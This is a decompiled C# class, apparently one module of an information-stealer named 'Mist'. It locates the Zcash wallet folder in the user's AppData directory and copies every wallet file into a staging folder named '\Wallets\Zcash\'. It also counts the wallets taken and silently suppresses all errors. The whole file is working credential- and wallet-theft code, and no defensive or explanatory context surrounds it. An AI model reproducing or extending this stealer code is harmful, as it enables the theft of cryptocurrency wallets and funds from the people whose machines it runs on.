using System;
using System.IO;

namespace Mist
{
	// Token: 0x02000071 RID: 113
	internal class Zcash
	{
		// Token: 0x060002B0 RID: 688 RVA: 0x00012BA8 File Offset: 0x00010DA8
		public static void ZecwalletStr(string directorypath)
		{
			try
			{
				if (Directory.Exists(Zcash.ZcashDir2))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(Zcash.ZcashDir2).GetFiles())
					{
						Directory.CreateDirectory(directorypath + Zcash.ZcashDir);
						fileInfo.CopyTo(directorypath + Zcash.ZcashDir + fileInfo.Name);
					}
					Wallets.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400016F RID: 367
		public static int count = 0;

		// Token: 0x04000170 RID: 368
		public static string ZcashDir = "\\Wallets\\Zcash\\";

		// Token: 0x04000171 RID: 369
		public static string ZcashDir2 = Help.AppDate + "\\Zcash\\";
	}
}
